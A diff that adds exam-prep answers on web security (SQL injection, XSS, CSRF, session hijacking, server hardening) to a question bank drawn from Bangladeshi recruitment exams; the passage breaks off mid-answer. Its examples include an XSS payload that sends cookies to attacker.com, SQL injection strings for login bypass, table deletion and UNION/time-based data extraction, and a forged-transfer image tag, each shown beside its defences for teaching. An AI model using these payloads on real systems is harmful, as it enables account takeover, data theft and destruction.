@@ -3019,41 +3019,691 @@
 
 1. Describe the SQL Injection and Cross-Site Scripting (XSS) web security threats and suggest preventive measures for each. *[Officer (IT) 31 Jul 2026 bscs 02 (ET: N/A)]*
 
+   Answer:
+
+   **(a) SQL Injection**
+   - A vulnerability where an attacker inserts malicious SQL into a user input field, so the database executes commands the developer never intended. It happens whenever user input is concatenated directly into a query string.
+
+   Example
+   ```php
+   // Vulnerable code
+   $query = "SELECT * FROM users WHERE user_id = '$id'";
+
+   // Attacker enters:  1' OR '1'='1
+   // Query becomes:
+   SELECT * FROM users WHERE user_id = '1' OR '1'='1'
+   ```
+   - The condition is always true, so every user record is returned instead of one.
+
+   Impact: authentication bypass, reading the whole database, modifying or deleting records, and in some configurations executing OS commands.
+
+   Prevention
+   - **Parameterised queries / prepared statements** — the single most effective fix. Input is treated strictly as DATA, never as code.
+   - **Stored procedures** with parameters.
+   - **Whitelist input validation** — accept only the expected format.
+   - **ORM frameworks** (Hibernate, Entity Framework) that generate safe queries.
+   - **Least-privilege database account** — the web application must never connect as `root` or `sa`.
+   - **Generic error messages**, so the database structure is not revealed.
+   - **Web Application Firewall** as an additional layer.
+
+   **(b) Cross-Site Scripting (XSS)**
+   - A vulnerability where an attacker injects malicious script into a web page, which then executes in ANOTHER user's browser with that user's privileges.
+
+   Example
+   ```html
+   <!-- Attacker submits this as a comment -->
+   <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+   ```
+   - Every visitor who loads the page sends their session cookie to the attacker.
+
+   Types: **Stored** (script saved in the database and served to every visitor), **Reflected** (script comes back in the response to a crafted link), **DOM-based** (client-side JavaScript writes unsafe data into the DOM).
+
+   Impact: session cookie theft and account takeover, defacement, keylogging, phishing, and redirecting users to malicious sites.
+
+   Prevention
+   - **Output encoding** — HTML-encode all untrusted data before rendering. `<` becomes `&lt;`, so the browser displays it instead of executing it.
+   - **Input validation and sanitisation** using a proven library such as DOMPurify.
+   - **Content Security Policy (CSP)** — restricts which scripts the browser may execute.
+   - **HttpOnly cookies** — JavaScript cannot read them, so stolen scripts cannot steal the session.
+   - Avoid `innerHTML` and `eval()`; use `textContent` instead.
+
+   - Key distinction: SQL injection targets the SERVER's database; XSS targets ANOTHER USER's browser.
+
 2. Explain the vulnerability of SQL Injection. How can it be prevented? *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*
+
+   Answer:
+
+   The vulnerability
+   - SQL injection exists when an application builds a SQL query by concatenating user input directly into the query string. The database cannot tell where the developer's instruction ends and the user's data begins, so specially crafted input becomes executable SQL.
+
+   Classic example — login bypass
+   ```sql
+   -- Intended query
+   SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
+
+   -- Attacker enters username:  ' OR '1'='1' --
+   SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
+   ```
+   - `'1'='1'` is always true and `--` comments out the password check, so the attacker logs in with no password at all.
+
+   Types of SQL injection
+   - **Error-based** — deliberately triggers database errors to reveal table and column names.
+   - **Union-based** — uses `UNION SELECT` to pull data from other tables into the result set.
+   - **Blind boolean-based** — infers data from whether the page behaves differently for true and false conditions.
+   - **Blind time-based** — uses `SLEEP()` and measures response time to extract data one bit at a time.
+
+   Impact
+   - Authentication bypass, full database disclosure including password hashes and card data, data modification or deletion, privilege escalation, and in some setups OS command execution.
+
+   Prevention
+   - **Prepared statements with bound parameters** — the definitive fix:
+   ```php
+   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+   $stmt->execute([$username, $password]);
+   ```
+   - **Stored procedures** with parameters, not dynamic SQL inside them.
+   - **Whitelist input validation** — restrict to the expected type, length and character set.
+   - **Escape any input that genuinely cannot be parameterised**, such as a table name chosen from a fixed allowed list.
+   - **Least privilege** for the database account.
+   - **Generic error messages** and detailed logging server-side only.
+   - **WAF** and regular vulnerability scanning as defence in depth.
 
 3. **What is Cross site script and SQL injection?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*
 
+   Answer:
+
+   **Cross-Site Scripting (XSS)**
+   - Injecting malicious JavaScript into a web page so that it executes in other users' browsers.
+   - Three types: stored (saved in the database), reflected (returned in the response to a crafted URL), DOM-based (introduced by client-side JavaScript).
+   - Impact: session cookie theft, account takeover, defacement, phishing.
+   - Prevention: output encoding, input sanitisation, Content Security Policy, HttpOnly cookies.
+
+   **SQL Injection**
+   - Injecting malicious SQL into an input field so the database executes unintended commands.
+   - Impact: authentication bypass, full data disclosure, data modification or deletion.
+   - Prevention: parameterised queries, stored procedures, input validation, least-privilege database accounts.
+
+   Comparison
+
+   | Point | XSS | SQL Injection |
+   |---|---|---|
+   | Target | Another USER's browser | The SERVER's database |
+   | Injected language | JavaScript / HTML | SQL |
+   | Executes on | Client side | Server side |
+   | Data at risk | Session cookies, user credentials, page content | The entire database |
+   | Main prevention | Output encoding, CSP | Parameterised queries |
+
+   - Both appear in the OWASP Top 10 and both have the same root cause: **untrusted input being treated as code instead of data**.
+
 4. **What is CSRF attack?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*
+
+   Answer: **CSRF (Cross-Site Request Forgery)** is an attack that tricks a logged-in user's browser into sending an unwanted, authenticated request to a website, so an action is performed without the user's knowledge or consent.
+
+   Why it works
+   - Browsers automatically attach the session cookie to every request to a site, regardless of which page triggered the request.
+   - The server sees a valid session cookie and cannot tell that the user did not intend the action.
+
+   How the attack proceeds
+   ```mermaid
+   flowchart LR
+       U[User logged into bank.com] --> A[Visits attacker's page]
+       A -->|hidden form auto-submits| B[bank.com/transfer]
+       B -->|browser attaches session cookie| S[Bank server]
+       S -->|sees valid session — executes transfer| X[Money transferred]
+   ```
+
+   Example
+   ```html
+   <!-- On the attacker's page -->
+   <img src="https://bank.com/transfer?to=attacker&amount=50000">
+   ```
+   - Merely loading the attacker's page causes the victim's browser to send the transfer request with the victim's cookie attached.
+
+   Prevention
+   - **CSRF token (synchroniser token)** — the server embeds a random, unpredictable token in every form. A forged request from another site cannot know it. This is the primary defence.
+   - **SameSite cookie attribute** — `SameSite=Strict` sends the cookie only for requests originating from the same site; `SameSite=Lax` allows it for top-level navigation only. This blocks most CSRF automatically.
+   - **Verify the Origin and Referer headers**.
+   - **Re-authentication or OTP** for sensitive actions such as fund transfer.
+   - **Use POST, not GET, for state-changing actions** — a GET can be triggered by a simple `<img>` tag.
+   - **Double-submit cookie pattern** where a token cannot be stored server-side.
+
+   - Note: an XSS vulnerability defeats all CSRF protection, because injected script runs on the site itself and can simply read the token. XSS must be fixed first.
 
 5. **What is CSRF and XSS?** *[DESCO Sub-Assistant Engineer 20.06.2025 compact it 1361 (ET: BUET)]*
 
+   Answer:
+
+   **XSS (Cross-Site Scripting)**
+   - Injecting malicious script into a web page so it runs in another user's browser.
+   - The attacker STEALS data or hijacks the session by running code as the victim.
+   - Types: stored, reflected, DOM-based.
+   - Prevention: output encoding, input sanitisation, Content Security Policy, HttpOnly cookies.
+
+   **CSRF (Cross-Site Request Forgery)**
+   - Tricking a logged-in user's browser into performing an unwanted action on a site where they are authenticated.
+   - The attacker does not steal anything — they cause the victim to ACT.
+   - Prevention: CSRF tokens, SameSite cookies, Origin/Referer checking, re-authentication for sensitive operations.
+
+   Key differences
+
+   | Point | XSS | CSRF |
+   |---|---|---|
+   | What the attacker does | Runs their own script on the site | Makes the victim send a legitimate-looking request |
+   | Requires the victim to be logged in | Not necessarily | Yes, essential |
+   | Attacker sees the response | Yes | No — it is a blind, one-way attack |
+   | Root cause | Untrusted input rendered as code | Server trusting the session cookie alone |
+   | Main defence | Output encoding + CSP | CSRF token + SameSite cookie |
+   | Scope of damage | Read AND write as the victim | Write only |
+
+   - Relationship: XSS is the more severe of the two, because a successful XSS attack can bypass every CSRF defence by reading the token directly from the page.
+
 6. **What is SQL Injection? How to Prevent against SQL Injection Attacks?** *[RAKUB Programmer (PO) 12.10.2021 compact it 853-854 (ET: N/A)], [RAKUB Maintenance Engineer (PO) 05.10.2021 compact it 857 (ET: N/A)], [Dhaka WASA Assistant Maintenance Engineer (Network) 04.07.2025 compact it 1439 (ET: BUET)]*
+
+   Answer: SQL injection is a web attack in which malicious SQL statements are inserted into an application's input fields and executed by the backend database, allowing an attacker to view, modify or delete data they should not be able to reach.
+
+   Root cause
+   - User input concatenated directly into a SQL string, so the database cannot distinguish the developer's command from the attacker's data.
+
+   Example
+   ```sql
+   -- Vulnerable
+   "SELECT * FROM users WHERE id = " + userInput
+
+   -- Attacker input:  1; DROP TABLE users; --
+   SELECT * FROM users WHERE id = 1; DROP TABLE users; --
+   ```
+
+   Prevention techniques
+
+   **1. Prepared statements / parameterised queries — the primary defence**
+   ```java
+   PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
+   ps.setInt(1, userId);
+   ```
+   - The SQL structure is fixed before the input is supplied, so input can never change the query's meaning.
+
+   **2. Stored procedures** with parameters, avoiding dynamic SQL inside the procedure body.
+
+   **3. Input validation (whitelisting)** — enforce type, length, format and allowed character set. Reject rather than sanitise where possible.
+
+   **4. Escaping special characters** — only where parameterisation is genuinely impossible, and using the database driver's own escaping function.
+
+   **5. Principle of least privilege** — the application's database account should have only the permissions it needs, never DROP or administrative rights.
+
+   **6. Generic error messages** — never expose SQL errors, table names or stack traces to the user.
+
+   **7. ORM frameworks** — Hibernate, Entity Framework and Django ORM generate parameterised queries by default.
+
+   **8. Web Application Firewall** — blocks known injection patterns as an additional layer.
+
+   **9. Regular security testing** — automated scanning and manual penetration testing, plus code review focused on query construction.
+
+   - The single most important point: **validation and escaping are secondary. Parameterised queries are the real fix**, because they remove the possibility of input being interpreted as code at all.
 
 7. **(b) Explain XSS and CSRF (how do you prevent these attacks).** *[Titas Gas Assistant Engineer (CSE) 24.05.2024 compact it 415 (ET: BUET)]*
 
+   Answer:
+
+   **(a) XSS — Cross-Site Scripting**
+   - The attacker injects malicious JavaScript into a web page; when another user loads the page, the script runs in their browser with their session.
+
+   Types
+   - **Stored XSS** — the script is saved on the server (in a comment, profile field or forum post) and served to every visitor. The most dangerous.
+   - **Reflected XSS** — the script travels in a crafted URL and is echoed back in the response. Requires the victim to click the link.
+   - **DOM-based XSS** — client-side JavaScript writes untrusted data into the DOM without sanitising it.
+
+   Prevention
+   - **Output encoding** — encode data for the context it appears in (HTML body, attribute, JavaScript, URL). This is the primary fix.
+   - **Input sanitisation** with a maintained library such as DOMPurify; never write your own filter.
+   - **Content Security Policy (CSP)** — instruct the browser to run scripts only from approved sources, which blocks injected inline script.
+   - **HttpOnly cookies** — prevents JavaScript from reading the session cookie.
+   - Avoid `innerHTML`, `document.write()` and `eval()`; use `textContent`.
+   - Use a framework with automatic escaping (React, Angular escape by default).
+
+   **(b) CSRF — Cross-Site Request Forgery**
+   - The attacker causes a logged-in victim's browser to submit an unwanted authenticated request, performing an action the victim never intended.
+
+   Prevention
+   - **CSRF token** — a random unpredictable value embedded in every state-changing form and verified server-side. An off-site attacker cannot guess it.
+   - **SameSite cookie attribute** — `Strict` or `Lax` stops the browser attaching the session cookie to cross-site requests.
+   - **Check the Origin and Referer headers** on state-changing requests.
+   - **Require re-authentication or an OTP** for high-value operations such as fund transfers or password changes.
+   - **Never use GET for actions that change state**, since a GET can be triggered by an image tag.
+
+   - Ordering note: fix XSS FIRST. While an XSS hole exists, CSRF tokens provide no protection, because injected script can read the token straight from the page.
+
 8. **Your bank wants to secure an e-banking online system and wants to configure a web server in your data center. What kind of tools and technology do you use for this?** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 309 (ET: BIBM)]*
+
+   Answer: A layered set of tools and technologies is needed, organised by where each control sits.
+
+   (a) Network perimeter
+   - **Next-Generation Firewall** (Palo Alto, FortiGate, Cisco Firepower) with integrated IPS.
+   - **DMZ architecture** with dual firewalls — the web server in the DMZ, the database on the internal network.
+   - **DDoS protection** — an on-premises appliance plus an upstream scrubbing service or CDN.
+   - **Load balancer** (F5, HAProxy, Nginx) for availability and SSL offloading.
+
+   (b) Web and application layer
+   - **Web Application Firewall** (F5 ASM, Imperva, ModSecurity, Cloudflare WAF) with OWASP Top 10 rule sets.
+   - **Reverse proxy** so the real application server is never directly exposed.
+   - **Web server** — Apache or Nginx or IIS, hardened: unnecessary modules removed, directory listing disabled, server version banner suppressed.
+   - **TLS 1.2/1.3** with a certificate from a trusted CA, strong cipher suites, HSTS, and TLS 1.0/1.1 and weak ciphers disabled.
+
+   (c) Authentication and access
+   - **Multi-factor authentication** — OTP by SMS or an authenticator app, plus device binding.
+   - **Strong session management** — Secure, HttpOnly, SameSite cookies, short timeouts, session regeneration on login.
+   - **Role-based access control** and least privilege.
+   - **Privileged Access Management** with session recording for administrators.
+
+   (d) Data protection
+   - **Encryption at rest** — TDE for the database, encrypted backups.
+   - **HSM (Hardware Security Module)** for key storage and PIN operations.
+   - **Tokenisation** of card data so the application never stores the PAN.
+   - **Data masking** in test environments.
+
+   (e) Monitoring and detection
+   - **SIEM** (Splunk, QRadar, Wazuh) collecting logs from every layer.
+   - **IDS/IPS** on a mirror port.
+   - **EDR** on all servers.
+   - **File Integrity Monitoring** to detect unauthorised changes to web content.
+   - **24/7 SOC**.
+
+   (f) Development and testing
+   - **Secure SDLC** with code review and secure coding standards.
+   - **SAST and DAST** tools (SonarQube, Fortify, Burp Suite, OWASP ZAP).
+   - **Dependency scanning** for vulnerable libraries.
+   - **Regular VAPT** by an independent third party.
+
+   (g) Availability and continuity
+   - **High availability cluster**, **DR site** in a separate seismic zone, tested backups, and defined RTO/RPO.
+
+   (h) Compliance
+   - **Bangladesh Bank ICT Security Guideline**, **PCI DSS** for card data, and ISO 27001 as the governing framework.
 
 9. **What is SQL Injection attack? How it launched?** *[Sylhet Gas Field Limited (SGFL) Assistant Engineer (IT) 2023 compact it 588 (ET: BUET)]*
 
+   Answer: SQL injection is an attack in which malicious SQL is inserted into an application's input, causing the database to execute commands the developer never intended.
+
+   How it is launched — the attacker's process
+
+   **Step 1 — Find an injection point**
+   - Test every input that reaches the database: login forms, search boxes, URL parameters, cookies, HTTP headers.
+   - Enter a single quote `'`. If the application returns a database error, the input is reaching the query unescaped.
+
+   **Step 2 — Confirm the vulnerability**
+   - Try a boolean test: `1' AND '1'='1` (page loads normally) versus `1' AND '1'='2` (page differs). A difference confirms injection.
+
+   **Step 3 — Determine the query structure**
+   - Use `ORDER BY 1`, `ORDER BY 2`, ... until an error appears, revealing the number of columns.
+
+   **Step 4 — Extract data**
+   - **Union-based**: `' UNION SELECT username, password FROM users --`
+   - **Error-based**: force errors that print table and column names.
+   - **Blind boolean**: infer one character at a time from whether the page changes.
+   - **Blind time-based**: `' AND IF(1=1, SLEEP(5), 0) --` and measure the delay.
+
+   **Step 5 — Escalate**
+   - Read system tables to map the whole schema, extract password hashes, modify or delete records, or attempt OS command execution through features such as `xp_cmdshell`.
+
+   Automated tools
+   - **sqlmap** performs all of the above automatically, which is why even an unskilled attacker can exploit the vulnerability.
+
+   Prevention
+   - Parameterised queries, stored procedures, whitelist validation, least-privilege database accounts, generic error messages, and a WAF.
+
 10. **Write the difference types of Web application attacks?** *[Ministry of Land Assistant Maintenance Engineer 2023 compact it 595 (ET: N/A)]*
+
+    Answer: The standard reference is the **OWASP Top 10**. The main web application attacks:
+
+    **Injection attacks**
+    - **SQL Injection** — malicious SQL executed by the database.
+    - **Command Injection** — OS commands executed on the server.
+    - **LDAP / XML / NoSQL injection** — the same idea against other interpreters.
+
+    **Client-side attacks**
+    - **Cross-Site Scripting (XSS)** — script runs in another user's browser. Stored, reflected and DOM-based.
+    - **Cross-Site Request Forgery (CSRF)** — victim's browser is made to send an unwanted authenticated request.
+    - **Clickjacking** — an invisible frame captures the victim's clicks.
+
+    **Authentication and session attacks**
+    - **Broken authentication** — weak password policy, no lockout, predictable session IDs.
+    - **Session hijacking** — stealing a session cookie to impersonate a user.
+    - **Session fixation** — forcing a known session ID on the victim.
+    - **Credential stuffing and brute force**.
+
+    **Access control attacks**
+    - **Insecure Direct Object Reference (IDOR)** — changing `id=101` to `id=102` to read another user's record.
+    - **Privilege escalation** — a normal user gaining administrative rights.
+    - **Directory traversal** — `../../etc/passwd` to read files outside the web root.
+
+    **Configuration and design flaws**
+    - **Security misconfiguration** — default credentials, directory listing enabled, verbose errors.
+    - **Sensitive data exposure** — data sent or stored unencrypted.
+    - **Vulnerable and outdated components** — an unpatched library in the dependency tree.
+    - **Server-Side Request Forgery (SSRF)** — the server is made to fetch a URL of the attacker's choosing.
+    - **File upload vulnerability** — uploading a web shell.
+
+    **Availability attacks**
+    - **DoS / DDoS** against the application layer, and **resource exhaustion** through expensive queries.
+
+    - Common root cause across most of them: **trusting input, or trusting the client**. Every one of these is prevented by validating on the server and never assuming the request came from your own page.
 
 11. **Write two differences between SQL Injection and cross site scripting (XSS).** *[BICIC Assistant Programmer 2022 compact it 630 (ET: BUET)]*
 
+    Answer: Two key differences:
+
+    **1. Target and execution location**
+    - **SQL injection** targets the SERVER's database. The malicious code executes on the server, inside the database engine.
+    - **XSS** targets ANOTHER USER's browser. The malicious code executes on the client side, in the victim's browser.
+
+    **2. Language injected and what is compromised**
+    - **SQL injection** injects SQL, and compromises the DATA — the attacker can read, modify or delete the entire database.
+    - **XSS** injects JavaScript or HTML, and compromises the USER — the attacker steals session cookies, credentials and acts as that user.
+
+    Fuller comparison
+
+    | Point | SQL Injection | XSS |
+    |---|---|---|
+    | Injected language | SQL | JavaScript / HTML |
+    | Executes on | Server (database) | Client (victim's browser) |
+    | Victim | The application and its data | Another user of the application |
+    | Data at risk | Entire database | Session cookies, user data on the page |
+    | Main prevention | Parameterised queries | Output encoding and CSP |
+    | Severity | Usually critical — total data loss | High — account takeover |
+
+    - Shared root cause: both arise from **untrusted input being interpreted as code rather than data**. The fix in both cases is to keep data and code strictly separate — parameterisation for SQL, encoding for HTML.
+
 12. **What is SQL injection? How to prevent it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*
+
+    Answer: SQL injection is a vulnerability where an attacker inserts malicious SQL through a user input field, causing the database to run unintended commands. It occurs whenever user input is concatenated directly into a SQL query.
+
+    Example
+    ```sql
+    -- Vulnerable login query
+    SELECT * FROM users WHERE username='$user' AND password='$pass'
+
+    -- Attacker enters username:  admin' --
+    SELECT * FROM users WHERE username='admin' --' AND password=''
+    ```
+    - The `--` comments out the password check, so the attacker logs in as admin without a password.
+
+    Prevention
+    - **Prepared statements with bound parameters** — the definitive fix. Query structure is fixed before input arrives, so input can never alter it.
+    - **Stored procedures** using parameters.
+    - **Whitelist input validation** — accept only the expected type, length and characters.
+    - **Least-privilege database account** — no DROP, no administrative rights, and only the tables the application needs.
+    - **Escape input** only where parameterisation is impossible, using the driver's own escape function.
+    - **Generic error messages** so database internals are never disclosed.
+    - **ORM frameworks** that parameterise automatically.
+    - **Web Application Firewall** and regular penetration testing as additional layers.
+
+    - The order matters: parameterised queries first, everything else as defence in depth. Validation and WAF alone are not sufficient, because attackers routinely bypass filters.
 
 13. **What is Cross site script XSS and how can fix it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*
 
+    Answer: XSS is a vulnerability that lets an attacker inject malicious script into a web page, which then executes in the browsers of other users who view that page, running with those users' privileges and session.
+
+    Types
+    - **Stored (persistent)** — the script is saved on the server, in a comment, profile or forum post, and served to every visitor. Most dangerous.
+    - **Reflected (non-persistent)** — the script is included in a crafted URL and echoed back in the response. The victim must click the link.
+    - **DOM-based** — client-side JavaScript inserts untrusted data into the DOM without sanitising it; the server never sees the payload.
+
+    Example
+    ```html
+    <script>fetch('http://attacker.com/?c=' + document.cookie)</script>
+    ```
+    - Posted as a comment, this sends every reader's session cookie to the attacker.
+
+    How to fix it
+
+    **1. Output encoding — the primary fix**
+    - Encode all untrusted data for the context in which it appears. In HTML, `<` becomes `&lt;` and `>` becomes `&gt;`, so the browser DISPLAYS the text instead of executing it.
+    - Different contexts need different encoding: HTML body, HTML attribute, JavaScript, CSS and URL each have their own rules.
+
+    **2. Input validation and sanitisation**
+    - Whitelist what is allowed. For rich text, use a maintained sanitiser such as DOMPurify — never write your own filter.
+
+    **3. Content Security Policy (CSP)**
+    - An HTTP header telling the browser to execute scripts only from approved sources, which blocks injected inline script even if it gets through.
+
+    **4. HttpOnly and Secure cookies**
+    - `HttpOnly` prevents JavaScript from reading the session cookie, so even a successful XSS cannot steal the session.
+
+    **5. Safe DOM APIs**
+    - Use `textContent` instead of `innerHTML`; avoid `eval()` and `document.write()`.
+
+    **6. Use a framework with automatic escaping**
+    - React, Angular and Vue escape output by default. Disabling that (`dangerouslySetInnerHTML`) is where XSS usually re-enters.
+
+    - Golden rule: **never trust input, always encode output** — and encode according to where the data will actually be placed.
+
 14. **Write down the counter measure of SQL injection attack.** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*
+
+    Answer: Countermeasures in order of effectiveness.
+
+    **1. Parameterised queries / prepared statements — the primary countermeasure**
+    ```java
+    PreparedStatement ps = conn.prepareStatement(
+        "SELECT * FROM accounts WHERE acc_no = ? AND pin = ?");
+    ps.setString(1, accNo);
+    ps.setString(2, pin);
+    ```
+    - The query structure is compiled before the data arrives, so input can never change its meaning. This eliminates the vulnerability rather than filtering it.
+
+    **2. Stored procedures**
+    - Predefined queries with parameters, provided the procedure itself does not build dynamic SQL internally.
+
+    **3. Input validation (whitelisting)**
+    - Enforce expected data type, length, format and character set. Reject invalid input rather than trying to clean it.
+
+    **4. Principle of least privilege**
+    - The application's database account should have only SELECT, INSERT and UPDATE on the tables it needs — never DROP, never DBA rights. This limits the damage even if injection succeeds.
+
+    **5. Escaping special characters**
+    - Only where parameterisation is genuinely impossible, using the database driver's own escaping function.
+
+    **6. Error handling**
+    - Show generic messages to users; log full details server-side. Detailed SQL errors are a roadmap for the attacker.
+
+    **7. Web Application Firewall**
+    - Blocks known injection patterns. A useful layer, but not a substitute for fixing the code.
+
+    **8. Use an ORM**
+    - Hibernate, Entity Framework and Django ORM generate parameterised queries by default.
+
+    **9. Regular testing**
+    - Automated scanning (sqlmap, OWASP ZAP), manual penetration testing, and code review focused on how queries are constructed.
+
+    **10. Keep the database and drivers patched**, disable dangerous features such as `xp_cmdshell`, and monitor query logs for anomalies.
 
 15. **What is SQL Injection? How can we protect web Application from SQL Injection attack?** *[SPCBL Assistant Maintenance Engineer 20.11.2021 compact it 874 (ET: N/A)]*
 
+    Answer: SQL injection is a web application vulnerability in which an attacker submits crafted input containing SQL syntax, which the application concatenates into a query, causing the database to execute the attacker's commands.
+
+    What an attacker can achieve
+    - Bypass login without a password, read the entire database including password hashes, modify or delete records, escalate privileges, and in poorly configured systems execute operating system commands.
+
+    How to protect a web application
+
+    **(a) Code level — the real fix**
+    - Use **prepared statements with bound parameters** everywhere. There should be no string concatenation of user input into SQL anywhere in the codebase.
+    - Use **stored procedures** with parameters.
+    - Use an **ORM** that parameterises by default.
+    - Apply **whitelist input validation** on type, length and format.
+
+    **(b) Database level**
+    - **Least privilege** for the application account — no DDL rights, no administrative rights.
+    - Separate accounts for read and write operations.
+    - Disable dangerous stored procedures such as `xp_cmdshell`.
+    - Keep the database engine patched.
+
+    **(c) Application configuration**
+    - **Generic error pages** — never expose SQL errors or stack traces.
+    - Disable verbose debugging in production.
+    - Encrypt sensitive columns so stolen data is less useful.
+
+    **(d) Perimeter and monitoring**
+    - **Web Application Firewall** with injection rule sets.
+    - **Database activity monitoring** to alert on unusual query patterns.
+    - Centralised logging into a SIEM.
+
+    **(e) Process**
+    - Secure coding standards and mandatory code review.
+    - **SAST and DAST** in the build pipeline.
+    - Regular independent **VAPT**.
+    - Developer training — this vulnerability persists because developers keep writing concatenated queries.
+
+    - Summary: SQL injection is completely preventable at the code level. Every other control is damage limitation for the cases the code missed.
+
 16. **What is SQL injection? How many ways to prevent it?** *[Bangladesh Television Assistant Programmer 2019 compact it 1064 (ET: N/A)]*
+
+    Answer: SQL injection is a code injection attack in which malicious SQL statements are inserted into an application's input fields and then executed by the backend database, allowing unauthorised access to or manipulation of data.
+
+    Ways to prevent it — eight main methods
+
+    **1. Prepared statements (parameterised queries)** — the most effective. The SQL structure is fixed before user data is bound, so input can never be interpreted as code.
+
+    **2. Stored procedures** — predefined queries taking parameters, provided no dynamic SQL is built inside them.
+
+    **3. Input validation (whitelisting)** — accept only the expected data type, length, format and character set; reject everything else.
+
+    **4. Escaping user input** — using the database driver's own escape function, for the rare case where parameterisation is impossible.
+
+    **5. Least privilege** — the application's database account should hold only the minimum rights, never DROP or DBA privileges.
+
+    **6. Proper error handling** — generic messages to the user, full details logged server-side only.
+
+    **7. ORM frameworks** — Hibernate, Entity Framework, Django ORM and similar generate parameterised SQL automatically.
+
+    **8. Web Application Firewall and regular testing** — a WAF blocks known injection patterns, and VAPT plus automated scanning finds what code review missed.
+
+    - Additional supporting measures: keep the database patched, disable dangerous features such as `xp_cmdshell`, encrypt sensitive columns, and monitor database activity for anomalous queries.
+    - The essential point: methods 1 and 2 eliminate the vulnerability; the rest reduce the damage if it slips through.
 
 17. **(খ) Cross Site Scripting (XSS) বলতে কী বোঝায়? এর হাত থেকে রক্ষা পাওয়ার পদ্ধতিগুলো লিখুন।** *[16th NTRCA Lecturer (ICT) (ICT): 2019 compact it 1090 (ET: N/A)]*
 
+    Answer:
+
+    (a) What XSS means
+    - Cross-Site Scripting is a web vulnerability in which an attacker injects malicious script (usually JavaScript) into a web page. When another user loads that page, the script executes in THEIR browser, with their session and their privileges.
+    - The application is the delivery vehicle; the victim is another user of the site.
+
+    Types
+    - **Stored XSS** — the payload is saved on the server and served to everyone who views the page.
+    - **Reflected XSS** — the payload is in a crafted URL and echoed back in the response.
+    - **DOM-based XSS** — client-side JavaScript writes untrusted data into the page.
+
+    What an attacker gains
+    - Session cookie theft leading to account takeover, keylogging, defacement, redirecting users to phishing sites, and performing actions as the victim.
+
+    (b) Protection methods
+
+    - **Output encoding** — the primary defence. Encode every piece of untrusted data before rendering it, according to its context (HTML body, attribute, JavaScript, URL). `<script>` becomes `&lt;script&gt;` and is displayed rather than executed.
+    - **Input validation and sanitisation** — whitelist acceptable input; for rich text use a maintained sanitiser such as DOMPurify rather than a hand-written filter.
+    - **Content Security Policy (CSP)** — an HTTP header restricting which script sources the browser may execute, which neutralises injected inline script.
+    - **HttpOnly cookie flag** — JavaScript cannot read the session cookie, so even successful XSS cannot steal the session.
+    - **Secure and SameSite cookie flags** for additional protection.
+    - **Avoid dangerous DOM APIs** — use `textContent` instead of `innerHTML`; never use `eval()`.
+    - **Use a framework with automatic escaping** — React, Angular and Vue escape by default.
+    - **X-XSS-Protection and X-Content-Type-Options headers** as legacy browser hardening.
+    - **Regular security testing** — SAST, DAST and penetration testing.
+    - **Developer training** on the rule: never trust input, always encode output.
+
 18. **What is session hijacking and how to encrypt username and password in PHP?** *[Bangladesh Bank Assistant Maintenance Engineer 2017 compact it 1227-1228 (ET: N/A)]*
 
+    Answer:
+
+    (a) Session hijacking
+    - An attack in which the attacker takes over an already authenticated session by stealing or predicting the session identifier. No password is needed — possessing the session token IS being the user, as far as the server is concerned.
+
+    How the session ID is obtained
+    - **Packet sniffing** on an unencrypted connection.
+    - **XSS** reading `document.cookie`.
+    - **Session fixation** — forcing a known session ID on the victim before they log in.
+    - **Predictable session IDs** generated by a weak algorithm.
+    - **Man-in-the-middle** interception.
+
+    Prevention
+    - **HTTPS everywhere**, so the cookie can never be sniffed.
+    - **HttpOnly, Secure and SameSite** cookie flags.
+    - **Regenerate the session ID on login** (`session_regenerate_id(true)`), which defeats session fixation.
+    - **Long, cryptographically random session IDs**.
+    - **Short idle timeouts** and re-authentication for sensitive actions.
+    - Optionally bind the session to the client IP or user agent.
+
+    (b) Handling username and password in PHP
+
+    **Passwords must be HASHED, not encrypted.** Encryption is reversible; if the database is stolen along with the key, every password is exposed. Hashing is one-way.
+
+    ```php
+    // Registration — hash the password
+    $hash = password_hash($password, PASSWORD_DEFAULT);
+    // PASSWORD_DEFAULT currently uses bcrypt, and includes a random salt automatically
+
+    // Store $hash in the database (60+ characters)
+
+    // Login — verify
+    if (password_verify($enteredPassword, $storedHash)) {
+        session_regenerate_id(true);
+        $_SESSION['user'] = $username;
+        // login successful
+    }
+    ```
+
+    Why `password_hash()` and not `md5()` or `sha1()`
+    - MD5 and SHA-1 are fast, which makes brute-forcing billions of guesses per second feasible on a GPU. They are also broken for collision resistance.
+    - `password_hash()` uses **bcrypt** (or Argon2), which is deliberately SLOW and includes a random **salt** per password, so identical passwords produce different hashes and rainbow tables are useless.
+
+    Protecting the credentials in transit
+    - **Always use HTTPS/TLS.** Encrypting the password in JavaScript before sending is not a substitute — an attacker who can read the traffic can also read or replace the script.
+
 19. **What are the important steps to secure a web server?** *[Bangladesh Bank Assistant Maintenance Engineer 2017 compact it 1228 (ET: N/A)]*
+
+    Answer:
+
+    (a) Operating system hardening
+    - Install only what is needed; remove unnecessary packages and services.
+    - Apply **security patches promptly** — unpatched servers are the most common breach cause.
+    - Disable unused ports and protocols.
+    - Rename or disable default accounts; remove guest accounts.
+    - Enforce a strong password policy and use SSH keys rather than passwords.
+
+    (b) Web server configuration
+    - Run the web server as a **non-privileged user**, never as root or Administrator.
+    - **Disable directory listing** and remove default sample pages and applications.
+    - **Hide the version banner** (`ServerTokens Prod`, `ServerSignature Off`), so version-specific exploits cannot be targeted easily.
+    - Disable unnecessary modules and HTTP methods (TRACE, PUT, DELETE).
+    - Set correct file and directory permissions; the web root should not be writable by the web server process.
+    - Configure **security headers**: HSTS, CSP, X-Frame-Options, X-Content-Type-Options.
+
+    (c) Encryption
